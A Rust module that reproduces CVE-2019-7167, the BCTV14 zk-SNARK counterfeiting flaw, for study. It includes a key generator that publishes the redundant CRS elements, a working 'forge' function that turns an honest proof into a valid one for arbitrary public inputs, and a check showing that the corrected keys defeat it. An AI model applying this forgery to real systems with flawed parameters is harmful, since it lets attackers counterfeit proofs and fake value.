//! CVE-2019-7167: the BCTV14 counterfeiting flaw of Gabizon, ePrint 2019/119.
//!
//! The flaw is *redundant elements in the CRS*. The BCTV14 paper's construction (and the BGG17
//! multi-party setup that followed it) publishes the elements `pi'_{A,i} = [alpha_A rho_A A_i(tau)]_1`
//! for the public-input indices `i`. The honest prover and verifier never touch them —
//! libsnark's own generator zeroes that prefix, which is why parameters built directly by libsnark
//! were not vulnerable — but once those elements are public a malicious prover can take a valid proof
//! for *some* public input and rewrite it into a valid proof for *any* public input.
//!
//! Given a valid proof `pi` for input `x` and any target `x'`, set
//! `eta_A  := pi_A  + sum_i (x_i - x'_i) * pk_{A,i}` and
//! `eta'_A := pi'_A + sum_i (x_i - x'_i) * pk'_{A,i}`,
//! where `pk_{A,i} = [rho_A A_i(tau)]_1` are the IC elements (already public in the verification key)
//! and `pk'_{A,i}` are the redundant elements. Then `(eta_A, pi_B, pi_C, eta'_A, pi'_B, pi'_C, pi_H,
//! pi_K)` verifies for `x'`: the input part `PI(x') + eta_A` collapses back to `PI(x) + pi_A`, so the
//! divisibility and same-coefficient checks still pass, and `pk'_{A,i} = alpha_A * pk_{A,i}` keeps
//! the A knowledge-check happy — which is impossible without the redundant elements.

use ark_bn254::{Fr, G1Affine, G1Projective};
use ark_ec::{CurveGroup, PrimeGroup};
use ark_std::rand::rngs::StdRng;
use zk_circuit::lower::r1cs::R1cs;

use crate::field::Bn254Fr;
use crate::keys::{ProvingKey, VerifyingKey, generate_with_internals};
use crate::proof::Proof;

/// The redundant `pi'_A` input elements the flaw exposes: `pk'_{A,i} = alpha_A rho_A A_i(tau) G1`
/// for each public input `i`, in declaration order. These are exactly what libsnark omitted.
pub struct FlawExtras {
    /// `alpha_A rho_A A_i(tau) G1` per public input.
    pub a_prime_ic: Vec<G1Affine>,
}

/// The flawed generator: the same keys as [`crate::keys::generate`], plus the redundant elements.
pub fn generate_flawed(
    r1cs: &R1cs<Bn254Fr>,
    rng: &mut StdRng,
) -> Option<(ProvingKey, VerifyingKey, FlawExtras)> {
    let (pk, vk, internals) = generate_with_internals(r1cs, rng)?;
    let g1 = G1Projective::generator();
    // pk'_{A,i} = alpha_A * rho_A * A_i(tau) * G1 for public inputs i = 1..=num_inputs.
    let scaled: Vec<G1Projective> = internals.ic_coefficients[1..]
        .iter()
        .map(|coeff| g1 * (internals.alpha_a * internals.rho_a * coeff))
        .collect();
    let a_prime_ic = G1Projective::normalize_batch(&scaled);
    Some((pk, vk, FlawExtras { a_prime_ic }))
}

/// The forgery: rewrite a valid proof for `x_true` into a valid proof for `x_false`, using the
/// redundant elements. Returns `None` if the input lengths disagree.
pub fn forge(
    flaw: &FlawExtras,
    vk: &VerifyingKey,
    honest: &Proof,
    x_true: &[Fr],
    x_false: &[Fr],
) -> Option<Proof> {
    if x_true.len() != x_false.len()
        || x_true.len() != vk.ic_values.len()
        || x_true.len() != flaw.a_prime_ic.len()
    {
        return None;
    }
    let mut eta_a = G1Projective::from(honest.a);
    let mut eta_a_prime = G1Projective::from(honest.a_prime);
    for i in 0..x_true.len() {
        let delta = x_true[i] - x_false[i];
        eta_a += vk.ic_values[i] * delta;
        eta_a_prime += flaw.a_prime_ic[i] * delta;
    }
    Some(Proof { a: eta_a.into_affine(), a_prime: eta_a_prime.into_affine(), ..honest.clone() })
}

/// What an attacker limited to the *corrected* keys can do: adjust `eta_A` from the public IC vector
/// alone, with no way to fix `eta'_A`. The A knowledge-commitment check then fails, so the ordinary
/// verifier rejects it — this is why removing the redundant elements closes the attack.
pub fn forge_without_redundant_elements(
    vk: &VerifyingKey,
    honest: &Proof,
    x_true: &[Fr],
    x_false: &[Fr],
) -> Option<Proof> {
    if x_true.len() != x_false.len() || x_true.len() != vk.ic_values.len() {
        return None;
    }
    let mut eta_a = G1Projective::from(honest.a);
    for i in 0..x_true.len() {
        eta_a += vk.ic_values[i] * (x_true[i] - x_false[i]);
    }
    Some(Proof { a: eta_a.into_affine(), ..honest.clone() })
}
